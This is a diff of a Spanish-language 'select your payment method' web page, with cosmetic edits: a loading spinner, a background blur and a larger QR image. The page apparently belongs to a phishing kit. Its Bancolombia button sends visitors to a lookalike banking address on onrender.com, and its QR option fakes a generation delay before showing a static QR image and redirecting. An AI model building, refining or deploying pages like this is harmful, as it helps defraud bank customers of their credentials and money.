@@ -13,7 +13,7 @@
         }
 
         body {
-             justify-content: center;
+            justify-content: center;
             align-items: center;
             height: 100vh;
             background-color: #ffffff;
@@ -66,7 +66,7 @@
         }
 
         .qr-box img {
-            width: 200px;
+            width: 250px;
             margin: 15px 0;
         }
 
@@ -74,6 +74,28 @@
             margin-bottom: 10px;
         }
 
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #ccc;
+            border-top: 4px solid #000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        #form-container.blur {
+            filter: blur(5px);
+        }
     </style>
 </head>
 
@@ -87,49 +109,25 @@
     <center>
         <div id="form-container">
             <p style="font-size: 22px; font-weight: bold;">Selecciona tu método de pago</p>
-
-
-
-
-
-
-
-
-<br>
-
-
-
+            <br>
             <button id="boton-bancolombia" onclick="window.location.href='https://personasbancolombia-rmo3.onrender.com/enlinea/'">
-                <img width="200px" src="pagolombia.png" alt=""></button>
-         <p>Ingresa a Bancolombia</p>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+                <img width="200px" src="pagolombia.png" alt="">
+            </button>
+            <p>Ingresa a Bancolombia</p>
 
             <button id="qr-bancolombia">
-                <img width="150px" src="cod-QR.webp" alt=""></button>
-<p>Genera Qr de Pago</p>
-
-
+                <img width="150px" src="cod-QR.webp" alt="">
+            </button>
+            <p>Genera Qr de Pago</p>
         </div>
     </center>
 
     <div id="qr-modal">
-        <div class="qr-box">
+        <div class="qr-box" id="qr-loading-box">
+            <h3>Generando código QR</h3>
+            <div class="loading-spinner"></div>
+        </div>
+        <div class="qr-box" id="qr-generated-box" style="display: none;">
             <h3>QR Generado con éxito</h3>
             <p>Escanea el siguiente QR con tu app Bancolombia o Nequi.</p>
             <img src="qr.jpg" alt="QR para pago">
@@ -139,14 +137,22 @@
 
     <script>
         document.getElementById('qr-bancolombia').addEventListener('click', function() {
-            // Mostrar la ventana emergente del QR
+            // Mostrar la ventana emergente del QR y efecto borroso en el fondo
             const qrModal = document.getElementById('qr-modal');
+            const formContainer = document.getElementById('form-container');
             qrModal.style.display = 'flex';
+            formContainer.classList.add('blur');
 
-            // Configurar redirección después de 5 minutos
+            // Mostrar el spinner de carga por 5 segundos y luego mostrar el QR generado
             setTimeout(function() {
-                window.location.href = "fila.html";
-            }, 5 * 60 * 1000); // 5 minutos
+                document.getElementById('qr-loading-box').style.display = 'none';
+                document.getElementById('qr-generated-box').style.display = 'block';
+
+                // Configurar redirección después de 2 minutos
+                setTimeout(function() {
+                    window.location.href = "fila.html";
+                }, 2 * 60 * 1000); // 2 minutos
+            }, 5000); // Esperar 5 segundos para mostrar el QR
         });
     </script>
 </body>
